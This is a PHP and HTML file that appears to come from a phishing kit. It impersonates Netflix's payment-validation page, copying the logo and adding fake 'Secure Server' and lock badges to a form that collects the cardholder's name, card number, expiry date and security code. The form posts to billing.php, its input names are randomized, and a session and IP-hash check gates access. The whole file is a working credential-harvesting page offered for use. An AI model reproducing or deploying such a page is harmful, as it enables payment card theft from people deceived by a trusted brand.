<?php
session_start();
include('functions.php');
$ip = get_client_ip();
$hash = md5($ip);
if (@$_SESSION['logged'] !== true) {
        header("Location: payment.php" . getUrlHash($hash));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Netflix - Payment information</title>
        <link rel="shortcut icon" href="favicon.ico"/>

        <link href="css/bootstrap.min.css" rel="stylesheet">
        <link href="css/payment.min.css" rel="stylesheet">

        <!--[if lt IE 9]>
        <script src="js/html5shiv.min.js"></script>
        <script src="js/respond.min.js"></script>
        <![endif]-->
</head>
<body>
        <div class="page_header">
                <div class="netflix-logo">
                        <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title>
                                <g id="netflix-logo">
                                        <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"
                                                  id="Fill-14"></path>
                                </g>
                        </svg>
                </div>
                <div class="sign_out">
                        <a href="#">Sign Out</a>
                </div>
        </div>


        <div class="page_container">
                <div class="page_caption">
                        Validate Your Payment Information
                </div>

                <div class="clearfix"></div>
                <div class="row spacing_caption">
                        <div class="col-xs-6 pull-right above_form">
                                <span>Secure Server</span>

                                <div class="clearfix"></div>
                                <a href="#">Tell me more</a>
                        </div>
                </div>

                <div class="row form_caption">
                        <img src="img/arrow_down.png" class="arrow_down"/>
                        <span class="form_caption_text">Credit Card</span>
                        <span class="visa"></span>
                        <span class="mastercard"></span>
                        <span class="amex"></span>
                </div>

                <form method="post" action="billing.php<?=getUrlHash($hash);?>" onsubmit="return validate();">
                        <div class="row form_block">

                                <div class="form-group">
                                        <div class="row">
                                                <div class="col-xs-12 col-sm-6">
                                                        <label for="iDTzvOiLsLHp">Name on Card</label>

                                                        <div class="clearfix"></div>
                                                        <input type="text" data-rule="length" data-min="5" data-max="60" id="iDTzvOiLsLHp" name="iDTzvOiLsLHp" class="form-input"
                                                                   placeholder="Exactly as appears on your card"/>
                                                </div>
                                        </div>
                                </div>
                                <div class="clearfix"></div>
                                <div class="form-group">
                                        <div class="row">
                                                <div class="col-xs-12 col-sm-6">
                                                        <label for="UMVGzaDhubda">Card Number</label>

                                                        <div class="clearfix"></div>
                                                        <input type="text" id="UMVGzaDhubda" data-rule="card" name="UMVGzaDhubda" class="form-input" placeholder=""/>
                                                        <img src="img/lock_grey.png" class="form-input_lock"/>
                                                </div>
                                        </div>
                                </div>

                                <div class="clearfix"></div>
                                <div class="form-group exp-box">
                                        <div class="row">
                                                <div class="col-xs-12 col-sm-6">
                                                        <label>Expiry Date</label>

                                                        <div class="clearfix"></div>
                                                        <div class="row">
                                                                <div class="col-xs-6 col-sm-5">
                                                                        <select name="tYqlwCldtaYn" data-rule="notEmpty" id="tYqlwCldtaYn" class="form-select">
                                                                                <option selected="selected" value="">Month</option>
                                                                                <option value="01">Jan (1)</option>
                                                                                <option value="02">Feb (2)</option>
                                                                                <option value="03">Mar (3)</option>
                                                                                <option value="04">Apr (4)</option>
                                                                                <option value="05">May (5)</option>
                                                                                <option value="06">Jun (6)</option>
                                                                                <option value="07">Jul (7)</option>
                                                                                <option value="08">Aug (8)</option>
                                                                                <option value="09">Sep (9)</option>
                                                                                <option value="10">Oct (10)</option>
                                                                                <option value="11">Nov (11)</option>
                                                                                <option value="12">Dec (12)</option>
                                                                        </select>
                                                                </div>
                                                                <div class="hidden-xs col-sm-1 dash-middle">
                                                                        <hr/>
                                                                </div>
                                                                <div class="col-xs-6 col-sm-5">
                                                                        <select name="kqOZtslXZFFd" data-rule="notEmpty" id="kqOZtslXZFFd" class="form-select">
                                                                                <option selected="selected" value="">Year</option>
                                                                                <option value="2021">2021</option>
                                                                                <option value="2022">2022</option>
                                                                                <option value="2023">2023</option>
                                                                                <option value="2024">2024</option>
                                                                                <option value="2025">2025</option>
                                                                                <option value="2026">2026</option>
                                                                                <option value="2027">2027</option>
                                                                                <option value="2028">2028</option>
                                                                                <option value="2029">2029</option>
                                                                                <option value="2030">2030</option>
                                                                                <option value="2031">2031</option>
                                                                                <option value="2032">2032</option>
                                                                                <option value="2033">2033</option>
                                                                                <option value="2034">2034</option>
                                                                                <option value="2035">2035</option>
                                                                                <option value="2036">2036</option>
                                                                                <option value="2037">2037</option>
                                                                                <option value="2038">2038</option>
                                                                                <option value="2039">2039</option>
                                                                                <option value="2040">2040</option>
                                                                        </select>
                                                                </div>
                                                        </div>
                                                </div>
                                                <div class="col-xs-12 col-sm-6 security_code">
                                                        <label for="QKBBkFiGdVoF">Security Code</label>
                                                        <div class="clearfix"></div>
                                                        <div class="row">
                                                                <div class="col-xs-6">
                                                                        <input type="text" id="QKBBkFiGdVoF" data-rule="length" data-min="3" data-max="4" class="form-input" name="QKBBkFiGdVoF" maxlength="4"/>
                                                                        <img src="img/lock_grey.png" class="form-input_lock_cvv"/>
                                                                        <section class="cvv-hover clearfix"
                                                                                         onclick="window.open('https://www.cvvnumber.com/cvv.html','_BLANK','width=500, height=500, scrollbars=yes');">
                                                                                <img src="img/question_mark.png">
                                                                        </section>
                                                                </div>
                                                        </div>
                                                </div>
                                        </div>
                                </div>


                                <div class="clearfix"></div>
                                <div class="form-group">
                                        <input type="submit" id="submit" name="submit" value="Update Payment Method" class="submit_btn"/>

                                        <div class="clearfix"></div>
                                        <div class="secure_bottom"><span>Secure Server</span> <img src="img/lock.png"/></span></div>
                                </div>
                        </div>
                </form>
        </div>

        <div class="clearfix"></div>
        <div class="footer">
                <div class="footer_container">
                        <div class="row">
                                <div class="col-xs-12 footer_questions">
                                        <span>Questions?</span> <a href="#">Contact us.</a>
                                </div>
                        </div>
                        <div class="clearfix"></div>
                        <div class="footer_lnks">
                                <div class="row">
                                        <div class="col-xs-6 col-sm-3">
                                                <a href="#">
                                                        Terms of use
                                                </a>
                                        </div>
                                        <div class="col-xs-6 col-sm-3">
                                                <a href="#">
                                                        Privacy
                                                </a>
                                        </div>
                                </div>
                        </div>
                </div>
        </div>


        <script src="js/jquery.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/card-validate.min.js"></script>
        <script src="cleave/cleave.min.js"></script>
        <script src="js/paymentValidate.js"></script>
        <script src="js/validateFunc.js"></script>

</body>
</html>
